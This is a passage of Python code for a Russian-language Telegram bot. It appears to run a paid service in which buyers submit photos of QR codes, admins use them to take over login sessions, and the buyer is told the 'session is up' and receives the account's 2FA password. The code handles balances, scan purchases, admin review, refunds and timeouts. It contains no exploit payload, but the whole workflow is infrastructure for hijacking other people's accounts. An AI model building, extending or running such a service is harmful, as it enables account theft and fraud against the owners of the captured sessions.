@router.message(F.text == "🛒 Купить сканы")
async def buy_scans(msg: Message, state: FSMContext):
    if msg.chat.type != "private" or not has_access(msg.from_user.id):
        return
    await state.set_state(BuyState.qty)
    await msg.answer(
        f"{E_CART} Покупка сканов, блядь\n\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"{E_CASH} Цена: {PRICE_PER_SCAN:.2f} $ за скан\n"
        f"{E_DOWN} Минимум: {MIN_PURCHASE} сканов\n"
        f"{E_MONEY} Баланс: {get_balance(msg.from_user.id):.2f} $\n"
        f"➖➖➖➖➖➖➖➖➖➖\n\n"
        f"Введи количество, не тупи:",
        parse_mode=PARSE,
    )

@router.message(BuyState.qty)
async def buy_qty(msg: Message, state: FSMContext):
    try:
        qty = int(msg.text)
        if qty < MIN_PURCHASE:
            await msg.answer(f"{E_FAIL} Хуйня. Минимум — {MIN_PURCHASE} сканов.", parse_mode=PARSE)
            return
    except ValueError:
        await msg.answer(f"{E_FAIL} Ты дебил? Введи целое число.", parse_mode=PARSE)
        return
    total = qty * PRICE_PER_SCAN
    balance = get_balance(msg.from_user.id)
    if balance < total:
        await msg.answer(
            f"{E_FAIL} Денег нет, хули\n\n"
            f"➖➖➖➖➖➖➖➖➖➖\n"
            f"{E_RECEIPT} Нужно: {total:.2f} $\n"
            f"{E_MONEY} У тебя: {balance:.2f} $\n"
            f"➖➖➖➖➖➖➖➖➖➖\n\n"
            f"Пополни: «💰 Пополнить».",
            parse_mode=PARSE,
        )
        return
    change_balance(msg.from_user.id, -total)
    change_scans(msg.from_user.id, qty)
    cur.execute("INSERT INTO purchases (user_id, product, qty, code, total) VALUES (?,?,?,?,?)",
                (msg.from_user.id, "Сканы", qty, f"buy_{uuid.uuid4().hex}", total))
    db.commit()
    await state.clear()
    await msg.answer(
        f"{E_OK} Покупка успешна, ёбана\n\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"{E_PACK} Куплено: {qty} сканов\n"
        f"{E_OUT} Списано: {total:.2f} $\n"
        f"{E_MONEY} Баланс: {get_balance(msg.from_user.id):.2f} $\n"
        f"➖➖➖➖➖➖➖➖➖➖\n\n"
        f"Добавь бота в группу и напиши /add, хули.",
        reply_markup=main_menu(),
        parse_mode=PARSE,
    )

# ---------- Фото ----------
@router.message(F.photo)
async def on_photo(msg: Message):
    uid = msg.from_user.id
    if is_banned(uid):
        await msg.answer(f"{E_BAN} Ты забанен, хули.", parse_mode=PARSE)
        return
    if not is_work():
        await msg.answer(f"{E_PAUSE} Бот на паузе, блядь\n\nВ пуле нет сессий. Попробуй позже.", parse_mode=PARSE)
        return
    if msg.chat.type in ("group", "supergroup"):
        owner_id = get_group_owner(msg.chat.id)
        if not owner_id:
            await msg.answer(f"{E_WARN} Группа не активирована, хули.\n\nВладелец должен написать /add.", parse_mode=PARSE)
            return
        gid = msg.chat.id
    else:
        if not has_access(uid):
            return
        owner_id, gid = uid, None
    if get_scans(owner_id) <= 0:
        await msg.answer(f"{E_WARN} Сканы закончились, хули.\n\nПополни: «💰 Пополнить» в ЛС бота.", parse_mode=PARSE)
        return
    file_id = msg.photo[-1].file_id
    await msg.answer(f"{E_SEARCH} Проверяю фото, подожди...", parse_mode=PARSE)
    change_scans(owner_id, -1)
    cur.execute("INSERT INTO scans (user_id, group_id, file_id, status) VALUES (?, ?, ?, 'pending')",
                (owner_id, gid, file_id))
    db.commit()
    scan_id = cur.lastrowid
    place = msg.chat.title if gid else "ЛС"
    caption = (
        f"{E_CAM} Новый скан #{scan_id}, блядь\n\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"{E_PROFILE} От: {uid} (@{msg.from_user.username})\n"
        f"{E_CROWN} Владелец: {owner_id}\n"
        f"{E_PIN} Место: {place}\n"
        f"➖➖➖➖➖➖➖➖➖➖\n\n"
        f"Проверь QR, хули."
    )
    for admin_id in all_admins():
        try:
            sent = await bot.send_photo(admin_id, file_id, caption=caption, reply_markup=scan_review_kb(scan_id), parse_mode=PARSE)
            cur.execute("UPDATE scans SET admin_msg_id=? WHERE id=?", (sent.message_id, scan_id))
            db.commit()
        except Exception:
            pass

# ---------- Кнопки админа по скану ----------
@router.callback_query(F.data.startswith("scan_ok_"))
async def scan_ok(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    scan_id = int(cb.data.split("_")[2])
    scan = cur.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
    if not scan or scan["status"] != "pending":
        await cb.answer("Скан уже обработан, хули ты жмёшь.", show_alert=True)
        return
    await state.update_data(scan_id=scan_id)
    await state.set_state(PasswordState.waiting)
    await cb.message.answer(
        f"{E_OK} Скан #{scan_id}, ёпта\n\nВведи пароль 2FA.\nЕсли 2FA нет — отправь `-`.",
        parse_mode=PARSE,
    )
    await cb.answer()

@router.message(PasswordState.waiting)
async def process_password(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    data = await state.get_data()
    scan_id = data["scan_id"]
    password = msg.text.strip()
    scan = cur.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
    if not scan or scan["status"] != "pending":
        await state.clear()
        await msg.answer(f"{E_INFO} Скан уже обработан, хули ты жмёшь.", parse_mode=PARSE)
        return
    cur.execute("UPDATE scans SET status='success' WHERE id=?", (scan_id,))
    db.commit()
    if password == "-":
        text = f"{E_PARTY} ПИЗДАТО СЕССИЯ ВСТАЛА, ХУЛИ!\n\n2FA нет."
    else:
        text = f"{E_PARTY} ПИЗДАТО СЕССИЯ ВСТАЛА, ХУЛИ!\n\n{E_KEY} Пароль: {password}"
    try:
        await bot.send_message(scan["user_id"], text, parse_mode=PARSE)
    except Exception:
        pass
    await state.clear()
    await msg.answer(f"{E_OK} Скан #{scan_id} подтверждён, заебись\n\nПароль: {password}", parse_mode=PARSE)

@router.callback_query(F.data.startswith("scan_fail_"))
async def scan_fail(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    scan_id = int(cb.data.split("_")[2])
    scan = cur.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
    if not scan or scan["status"] != "pending":
        await cb.answer("Скан уже обработан, хули ты жмёшь.", show_alert=True)
        return
    change_scans(scan["user_id"], +1)
    cur.execute("UPDATE scans SET status='failed' WHERE id=?", (scan_id,))
    db.commit()
    try:
        await bot.send_message(
            scan["user_id"],
            f"{E_SKULL} ЕБАТЬ ТЫ ЛОХ, СЕССИЯ СДОХЛА\n\n{E_PACK} Скан возвращён на баланс.",
            parse_mode=PARSE,
        )
    except Exception:
        pass
    await cb.message.edit_caption(
        caption=(cb.message.caption or "") + f"\n\n{E_FAIL} Скан #{scan_id} отклонён, хули",
        parse_mode=PARSE,
    )
    await cb.answer("Скан возвращён на баланс владельца.")

# ---------- Таймаут скана ----------
async def scan_timeout_watcher():
    while True:
        try:
            rows = cur.execute("SELECT * FROM scans WHERE status='pending'").fetchall()
            for r in rows:
                try:
                    created = datetime.strptime(r["created_at"], "%Y-%m-%d %H:%M:%S")
                    elapsed = (datetime.utcnow() - created).total_seconds()
                except Exception:
                    continue
                if elapsed < SCAN_TIMEOUT_SECONDS:
                    continue
                cur.execute("UPDATE scans SET status='failed' WHERE id=? AND status='pending'", (r["id"],))
                db.commit()
                change_scans(r["user_id"], +1)
                try:
                    await bot.send_message(
                        r["user_id"],
                        f"{E_SKULL} ЕБАТЬ ТЫ ЛОХ, СЕССИЯ СДОХЛА\n\n"
                        f"{E_FAIL} Неуспешно, скан отклонён системой (таймаут 2 мин).\n"
                        f"{E_PACK} Скан возвращён на баланс.",
                        parse_mode=PARSE,
                    )
                except Exception:
                    pass
                for admin_id in all_admins():
                    try:
                        await bot.send_message(
                            admin_id,
                            f"{E_HOUR} Скан #{r['id']} отклонён системой (таймаут 2 мин).\n"
                            f"{E_PROFILE} Владелец: {r['user_id']}",
                            parse_mode=PARSE,
                        )
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(30)

# ---------- Таймаут запроса владельца ----------
async def owner_request_watcher():
    while True:
        try:
            now = datetime.utcnow().timestamp()
            rows = cur.execute("SELECT * FROM owner_requests").fetchall()
            for r in rows:
                if now - r["created_at"] > OWNER_REQUEST_TTL:
                    cur.execute("DELETE FROM owner_requests WHERE group_id=?", (r["group_id"],))
                    db.commit()
                    try:
                        await bot.send_message(
                            r["to_user"],
                            f"{E_HOUR} Запрос на владение группой истёк.",
                            parse_mode=PARSE,
                        )
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(60)

